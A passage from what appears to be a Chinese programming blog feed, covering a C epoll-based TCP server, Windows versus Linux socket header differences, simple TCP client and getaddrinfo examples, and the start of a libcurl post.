fd, <span class="literal">NULL</span>);</span><br><span class="line">            close(fd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;客户端[%s:%d]: %s&quot;</span>, cip, cport, buf);</span><br><span class="line">        <span class="comment">/* 转换成大写字母 */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            buf[i] &amp;= <span class="number">0xdf</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">strncat</span>(data+<span class="built_in">strlen</span>(data), buf, len);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(args);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> PORT = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置服务器本地地址 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = htons(PORT);</span><br><span class="line">    addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 创建lfd作为监听socket */</span></span><br><span class="line">    <span class="type">int</span> lfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (lfd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;lfd创建失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 绑定addr到lfd上 */</span></span><br><span class="line">    res = bind(lfd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;lfd绑定失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 开始在lfd上监听,数组大小设置为128 */</span></span><br><span class="line">    res = listen(lfd, NR_CLIENTS);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;lfd监听失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 创建一个epoll树 */</span></span><br><span class="line">    <span class="type">int</span> epoll = epoll_create(EPOLL);</span><br><span class="line">    <span class="keyword">if</span> (epoll == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;epoll创建失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 创建公共变量 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">events</span>[<span class="title">EVSSIZE</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 添加lfd到epoll中 */</span></span><br><span class="line">    event.events = EPOLLIN | EPOLLET; <span class="comment">/* 将这个监听节点设置为边沿触发模式 */</span></span><br><span class="line">    event.data.fd = lfd;</span><br><span class="line">    epoll_ctl(epoll, EPOLL_CTL_ADD, lfd, &amp;event);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> event_count = epoll_wait(epoll, events, EVSSIZE, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; event_count; i++) &#123;</span><br><span class="line">            <span class="type">int</span> fd = events[i].data.fd;</span><br><span class="line">            <span class="type">pthread_t</span> tid;</span><br><span class="line">            <span class="keyword">if</span> (fd == lfd) &#123;</span><br><span class="line">                <span class="type">accept_t</span>* arg = (<span class="type">accept_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">accept_t</span>));</span><br><span class="line">                arg-&gt;lfd = lfd;</span><br><span class="line">                arg-&gt;epoll = epoll;</span><br><span class="line">                pthread_create(&amp;tid, <span class="literal">NULL</span>, acceptance, arg);</span><br><span class="line">                pthread_detach(tid);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">commu_t</span>* arg = (<span class="type">commu_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">commu_t</span>));</span><br><span class="line">                arg-&gt;fd = fd;</span><br><span class="line">                arg-&gt;epoll = epoll;</span><br><span class="line">                pthread_create(&amp;tid, <span class="literal">NULL</span>, communication, arg);</span><br><span class="line">                pthread_detach(tid);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(epoll);</span><br><span class="line">    close(lfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>在 Windows 和 Linux 下进行套接字编程时，所需的头文件有所不同。以下是对比分析：</p><hr><h3 id="1-Windows-下的头文件"><a href="#1-Windows-下的头文件" class="headerlink" title="1. Windows 下的头文件"></a><strong>1. Windows 下的头文件</strong></h3><p>Windows 使用的是 Winsock（Windows Sockets）API，所需头文件如下：</p><h4 id="必要的头文件"><a href="#必要的头文件" class="headerlink" title="必要的头文件"></a><strong>必要的头文件</strong></h4><ul><li><strong><code>&lt;winsock2.h&gt;</code></strong><br>  提供基本的套接字函数和数据结构，例如 <code>socket()</code>、<code>bind()</code>、<code>listen()</code>、<code>connect()</code>、<code>recv()</code>、<code>send()</code>、<code>closesocket()</code> 等。</li><li><strong><code>&lt;ws2tcpip.h&gt;</code></strong><br>  提供对现代网络协议（如 IPv6）和功能（如 <code>getaddrinfo()</code>、<code>inet_ntop()</code>）的支持。</li></ul><h4 id="额外头文件"><a href="#额外头文件" class="headerlink" title="额外头文件"></a><strong>额外头文件</strong></h4><ul><li><strong><code>&lt;windows.h&gt;</code></strong><br>  如果程序涉及到其他 Windows API 功能（如多线程、事件等），可能需要包含。</li></ul><h4 id="库文件"><a href="#库文件" class="headerlink" title="库文件"></a><strong>库文件</strong></h4><ul><li>需要链接 <code>Ws2_32.lib</code>，可以通过 <code>#pragma comment(lib, &quot;Ws2_32.lib&quot;)</code> 指令自动链接，或在项目设置中手动添加。</li></ul><hr><h3 id="2-Linux-下的头文件"><a href="#2-Linux-下的头文件" class="headerlink" title="2. Linux 下的头文件"></a><strong>2. Linux 下的头文件</strong></h3><p>Linux 使用的是 POSIX 套接字 API，头文件更简洁：</p><h4 id="必要的头文件-1"><a href="#必要的头文件-1" class="headerlink" title="必要的头文件"></a><strong>必要的头文件</strong></h4><ul><li><strong><code>&lt;arpa/inet.h&gt;</code></strong><br>  提供 IP 地址的转换函数，例如 <code>inet_pton()</code> 和 <code>inet_ntop()</code>。还包含了<code>&lt;sys/socket.h&gt;</code>和<code>&lt;netinet/in.h&gt;</code>。这个头文件可能是基于下面这两个头文件制作的，所以包含了这个头文件就不需要包含下面两个头文件了。</li><li><strong><code>&lt;sys/socket.h&gt;</code></strong><br>  提供套接字函数和数据结构，例如 <code>socket()</code>、<code>bind()</code>、<code>listen()</code>、<code>accept()</code>、<code>connect()</code> 等。</li><li><strong><code>&lt;netinet/in.h&gt;</code></strong><br>  提供与网络地址相关的结构（如 <code>sockaddr_in</code>）和常量（如 <code>INADDR_ANY</code>、<code>htons()</code>）。</li><li><strong><code>&lt;unistd.h&gt;</code></strong><br>  提供 POSIX 接口的常规函数，例如 <code>close()</code>，用于关闭套接字。</li></ul><h4 id="额外头文件-1"><a href="#额外头文件-1" class="headerlink" title="额外头文件"></a><strong>额外头文件</strong></h4><ul><li><strong><code>&lt;netdb.h&gt;</code></strong><br>  提供主机名解析的函数，例如 <code>getaddrinfo()</code> 和 <code>gethostbyname()</code>。</li></ul><hr><h3 id="Windows-和-Linux-的头文件对比表"><a href="#Windows-和-Linux-的头文件对比表" class="headerlink" title="Windows 和 Linux 的头文件对比表"></a><strong>Windows 和 Linux 的头文件对比表</strong></h3><table><thead><tr><th>功能</th><th>Windows 头文件</th><th>Linux 头文件</th></tr></thead><tbody><tr><td>基本套接字函数</td><td><code>&lt;winsock2.h&gt;</code></td><td><code>&lt;sys/socket.h&gt;</code></td></tr><tr><td>地址族、协议、常量定义</td><td><code>&lt;winsock2.h&gt;</code></td><td><code>&lt;netinet/in.h&gt;</code></td></tr><tr><td>地址转换函数</td><td><code>&lt;ws2tcpip.h&gt;</code></td><td><code>&lt;arpa/inet.h&gt;</code></td></tr><tr><td>主机名解析</td><td><code>&lt;ws2tcpip.h&gt;</code></td><td><code>&lt;netdb.h&gt;</code></td></tr><tr><td>关闭套接字函数</td><td><code>&lt;winsock2.h&gt;</code></td><td><code>&lt;unistd.h&gt;</code></td></tr><tr><td>系统通用功能</td><td><code>&lt;windows.h&gt;</code></td><td><code>&lt;unistd.h&gt;</code> (POSIX)</td></tr></tbody></table><h3 id="3-使用差异"><a href="#3-使用差异" class="headerlink" title="3. 使用差异"></a><strong>3. 使用差异</strong></h3><h4 id="1-closesocket-和-close"><a href="#1-closesocket-和-close" class="headerlink" title="1) closesocket() 和 close()"></a><strong>1) <code>closesocket()</code> 和 <code>close()</code></strong></h4><ul><li>Windows 下：套接字关闭需要用 <code>closesocket()</code>，因为套接字是特定于 Winsock 的资源。</li><li>Linux 下：直接使用 <code>close()</code> 函数，因为套接字被视为文件描述符。</li></ul><h4 id="2-初始化与清理"><a href="#2-初始化与清理" class="headerlink" title="2) 初始化与清理"></a><strong>2) 初始化与清理</strong></h4><ul><li>Windows：<ul><li>必须在使用任何网络功能前调用 <code>WSAStartup()</code> 初始化 Winsock。</li><li>使用完套接字后调用 <code>WSACleanup()</code> 进行清理。</li></ul></li><li>Linux：<ul><li>不需要专门的初始化或清理操作，直接使用套接字 API。</li></ul></li></ul><h4 id="3-错误处理"><a href="#3-错误处理" class="headerlink" title="3) 错误处理"></a><strong>3) 错误处理</strong></h4><ul><li><strong>Windows</strong>：使用 <code>WSAGetLastError()</code> 获取错误码。</li><li><strong>Linux</strong>：错误通过 <code>errno</code> 提供，使用 <code>perror()</code> 或 <code>strerror()</code> 打印。</li></ul><hr><h3 id="4-示例对比"><a href="#4-示例对比" class="headerlink" title="4. 示例对比"></a><strong>4. 示例对比</strong></h3><p>以下是 Windows 和 Linux 下一个简单的 TCP 客户端的代码示例，展示如何使用这些头文件。</p><h4 id="Windows-示例"><a href="#Windows-示例" class="headerlink" title="Windows 示例"></a><strong>Windows 示例</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    SOCKET sock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建套接字</span></span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span> (sock == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Socket creation failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置服务器地址</span></span><br><span class="line">    server.sin_family = AF_INET;</span><br><span class="line">    server.sin_port = htons(<span class="number">80</span>);</span><br><span class="line">    inet_pton(AF_INET, <span class="string">&quot;93.184.216.34&quot;</span>, &amp;server.sin_addr); <span class="comment">// www.example.com 的 IP 地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接服务器</span></span><br><span class="line">    <span class="keyword">if</span> (connect(sock, (<span class="keyword">struct</span> sockaddr *)&amp;server, <span class="keyword">sizeof</span>(server)) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Connection failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Connected successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭套接字和清理</span></span><br><span class="line">    closesocket(sock);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="Linux-示例"><a href="#Linux-示例" class="headerlink" title="Linux 示例"></a><strong>Linux 示例</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> sock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建套接字</span></span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sock == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Socket creation failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置服务器地址</span></span><br><span class="line">    server.sin_family = AF_INET;</span><br><span class="line">    server.sin_port = htons(<span class="number">80</span>);</span><br><span class="line">    inet_pton(AF_INET, <span class="string">&quot;93.184.216.34&quot;</span>, &amp;server.sin_addr); <span class="comment">// www.example.com 的 IP 地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接服务器</span></span><br><span class="line">    <span class="keyword">if</span> (connect(sock, (<span class="keyword">struct</span> sockaddr *)&amp;server, <span class="keyword">sizeof</span>(server)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Connection failed&quot;</span>);</span><br><span class="line">        close(sock);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Connected successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭套接字</span></span><br><span class="line">    close(sock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a><strong>5. 总结</strong></h3><table><thead><tr><th>特性</th><th>Windows</th><th>Linux</th></tr></thead><tbody><tr><td><strong>头文件</strong></td><td><code>&lt;winsock2.h&gt;</code>, <code>&lt;ws2tcpip.h&gt;</code></td><td><code>&lt;arpa/inet.h&gt;</code></td></tr><tr><td><strong>库文件</strong></td><td>必须链接 <code>Ws2_32.lib</code></td><td>无需额外库</td></tr><tr><td><strong>关闭套接字</strong></td><td><code>closesocket()</code></td><td><code>close()</code></td></tr><tr><td><strong>初始化</strong></td><td>必须调用 <code>WSAStartup()</code></td><td>无需初始化</td></tr><tr><td><strong>错误处理</strong></td><td>使用 <code>WSAGetLastError()</code></td><td>使用 <code>errno</code></td></tr></tbody></table><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> ai_flags;           <span class="comment">// 标志，提供额外的选项</span></span><br><span class="line">    <span class="type">int</span> ai_family;          <span class="comment">// 地址族（如 AF_INET 或 AF_INET6）</span></span><br><span class="line">    <span class="type">int</span> ai_socktype;        <span class="comment">// 套接字类型（如 SOCK_STREAM 或 SOCK_DGRAM）</span></span><br><span class="line">    <span class="type">int</span> ai_protocol;        <span class="comment">// 协议类型（如 IPPROTO_TCP 或 IPPROTO_UDP）</span></span><br><span class="line">    <span class="type">size_t</span> ai_addrlen;      <span class="comment">// 地址的长度（单位：字节）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> *<span class="title">ai_addr</span>;</span> <span class="comment">// 指向具体地址的指针</span></span><br><span class="line">    <span class="type">char</span> *ai_canonname;     <span class="comment">// 主机的规范名（可选）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> *<span class="title">ai_next</span>;</span> <span class="comment">// 指向下一个 addrinfo 的指针（用于链表）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 链接 Ws2_32.lib</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    <span class="type">char</span> ipstr[INET6_ADDRSTRLEN];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, result);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hostname = <span class="string">&quot;36.155.132.76&quot;</span>; <span class="comment">// 主机名</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *service = <span class="literal">NULL</span>;            <span class="comment">// 服务名 (也可以直接指定端口号，如 &quot;80&quot;)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> <span class="title">hints</span>, *<span class="title">res</span>, *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 hints</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;hints, <span class="number">0</span>, <span class="keyword">sizeof</span>(hints));</span><br><span class="line">    hints.ai_family = AF_UNSPEC;    <span class="comment">// 支持 IPv4 和 IPv6</span></span><br><span class="line">    hints.ai_socktype = SOCK_STREAM; <span class="comment">// 使用 TCP</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取地址信息</span></span><br><span class="line">    result = getaddrinfo(hostname, service, &amp;hints, &amp;res);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;getaddrinfo failed: %s\n&quot;</span>, gai_strerror(result));</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IP addresses for www.baidu.com:\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 遍历地址链表</span></span><br><span class="line">    <span class="keyword">for</span> (p = res; p != <span class="literal">NULL</span>; p = p-&gt;ai_next) &#123;</span><br><span class="line">        <span class="type">void</span> *addr;</span><br><span class="line">        <span class="type">char</span> *ipver;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取地址（区分 IPv4 和 IPv6）</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;ai_family == AF_INET) &#123; <span class="comment">// IPv4</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> *<span class="title">ipv4</span> =</span> (<span class="keyword">struct</span> sockaddr_in *)p-&gt;ai_addr;</span><br><span class="line">            addr = &amp;(ipv4-&gt;sin_addr);</span><br><span class="line">            ipver = <span class="string">&quot;IPv4&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// IPv6</span></span><br><span class="line">            <span class="keyword">struct</span> sockaddr_in6 *ipv6 = (<span class="keyword">struct</span> sockaddr_in6 *)p-&gt;ai_addr;</span><br><span class="line">            addr = &amp;(ipv6-&gt;sin6_addr);</span><br><span class="line">            ipver = <span class="string">&quot;IPv6&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转换 IP 地址为字符串并打印</span></span><br><span class="line">        inet_ntop(p-&gt;ai_family, addr, ipstr, <span class="keyword">sizeof</span>(ipstr));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %s: %s\n&quot;</span>, ipver, ipstr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放地址链表</span></span><br><span class="line">    freeaddrinfo(res);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理 Winsock</span></span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>libcurl示例代码</title>
      <link href="/2024/11/29/libcurl%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81/"/>
      <url>/2024/11/29/libcurl%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 